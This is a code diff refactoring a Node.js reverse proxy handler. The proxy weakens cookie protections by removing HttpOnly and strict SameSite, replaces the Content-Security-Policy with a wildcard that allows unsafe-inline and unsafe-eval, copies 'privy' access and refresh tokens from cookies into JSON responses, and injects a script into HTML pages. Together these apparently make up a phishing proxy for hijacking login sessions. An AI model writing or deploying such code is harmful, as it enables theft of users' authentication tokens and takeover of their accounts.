@@ -19,7 +19,7 @@ const proxy = createProxyMiddleware({
     let buffer = Buffer.from('');
     proxyRes.on('data', chunk => buffer = Buffer.concat([buffer, chunk]));
     proxyRes.on('end', () => {
-      // --- 1) Modify Set-Cookie flags as before ---
+      // 1) Modify Set-Cookie flags
       const rawCookies = proxyRes.headers['set-cookie'] || [];
       const modifiedCookies = rawCookies.map(cookie =>
         cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
@@ -28,13 +28,13 @@ const proxy = createProxyMiddleware({
         res.setHeader('Set-Cookie', modifiedCookies);
       }
 
-      // --- 2) Override CSP header ---
+      // 2) Override Content-Security-Policy
       res.setHeader(
         'Content-Security-Policy',
         "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
       );
 
-      // --- 3) Copy all other headers except Set-Cookie & CSP ---
+      // 3) Copy all other headers except Set-Cookie & CSP
       Object.entries(proxyRes.headers).forEach(([name, value]) => {
         const lower = name.toLowerCase();
         if (lower === 'set-cookie' || lower === 'content-security-policy') return;
@@ -43,37 +43,42 @@ const proxy = createProxyMiddleware({
 
       const contentType = proxyRes.headers['content-type'] || '';
 
-      // --- 4) If JSON response, inject the two tokens into the body ---
+      // 4) JSON branch: inject cookies into body
       if (contentType.includes('application/json')) {
         const text = buffer.toString('utf8');
+        let modifiedBody = text;
+
         try {
           const obj = JSON.parse(text);
 
-          // استخراج قيم الـ cookies
+          // extract cookie values
           let accessTokenValue = '';
           let refreshTokenValue = '';
           rawCookies.forEach(cookie => {
             const [pair] = cookie.split(';');
             const [name, ...rest] = pair.split('=');
             const value = rest.join('=');
-            if (name === 'privy-access-token')    accessTokenValue = value;
-            if (name === 'privy-refresh-token')   refreshTokenValue = value;
+            if (name === 'privy-access-token')  accessTokenValue = value;
+            if (name === 'privy-refresh-token') refreshTokenValue = value;
           });
 
-          // وضعها في جسم الـ JSON
+          // inject into JSON
           if (accessTokenValue)  obj.privy_access_token  = accessTokenValue;
           if (refreshTokenValue) obj.privy_refresh_token = refreshTokenValue;
 
-          const modifiedBody = JSON.stringify(obj);
-          res.setHeader('Content-Type', 'application/json');
-          return res.status(proxyRes.statusCode).send(modifiedBody);
+          modifiedBody = JSON.stringify(obj);
         } catch (err) {
           console.error('Failed to parse JSON body:', err);
-          // fallback to original buffer if parsing fails
+          // if parse error, leave modifiedBody = original text
         }
+
+        // send modified JSON
+        res.setHeader('Content-Type', 'application/json');
+        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
+        return res.end(modifiedBody);
       }
 
-      // --- 5) If HTML, inject your script before </body> ---
+      // 5) HTML branch: inject script
       if (contentType.includes('text/html')) {
         let html = buffer.toString('utf8');
         const scriptTag = `<script>
@@ -137,7 +142,7 @@ const proxy = createProxyMiddleware({
         return res.end(html);
       }
 
-      // --- 6) For all other content-types, just proxy through ---
+      // 6) Fallback: stream through unmodified
       res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
       res.end(buffer);
     });
@@ -147,6 +152,7 @@ const proxy = createProxyMiddleware({
 export default function handler(req, res) {
   return proxy(req, res, err => {
     console.error('Proxy error:', err);
-    res.status(500).send('Internal Server Error');
+    res.statusCode = 500;
+    res.end('Internal Server Error');
   });
 }
